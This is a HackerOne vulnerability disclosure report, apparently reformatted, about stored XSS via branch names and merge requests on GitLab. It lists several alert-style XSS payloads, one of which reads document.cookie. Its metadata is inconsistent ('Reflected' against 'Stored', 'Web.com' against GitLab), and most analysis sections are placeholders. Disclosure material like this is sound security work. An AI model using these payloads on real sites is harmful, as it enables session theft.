# Stored-XSS in merge requests

## Metadata
- **Source:** HackerOne
- **Report:** 1261148 | https://hackerone.com/reports/1261148
- **Submitted:** 2021-07-14
- **Reporter:** ba5d2d132de8622c890dd60
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** none
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Summary
As an attacker I could do XSS on Web.com because it is vulnerable Stored XSS, also known as persistent XSS, is more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.


### Steps to reproduce
1. Go to https://gitlab.com/
2. Create a new branch with name  any of these

<form><button formaction=javascript&colon;alert(1)

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Summary
As an attacker I could do XSS on Web.com because it is vulnerable Stored XSS, also known as persistent XSS, is more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.


### Steps to reproduce
1. Go to https://gitlab.com/
2. Create a new branch with name  any of these

<form><button formaction=javascript&colon;alert(1)>CLICKME

"><img src=x onerror=alert(document.domain)>

<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=></iframe>

<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>

3. Create a new merge request from the new branch to master
4. XSS is saved and if you will open the readme file and add these payloads to it it will also save these payloads




### Output of checks

This bug happens on GitLab.com

## Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. The attacker can steal data from whoever checks the report.

</details>

---
*Analysed by Claude on 2026-05-24*
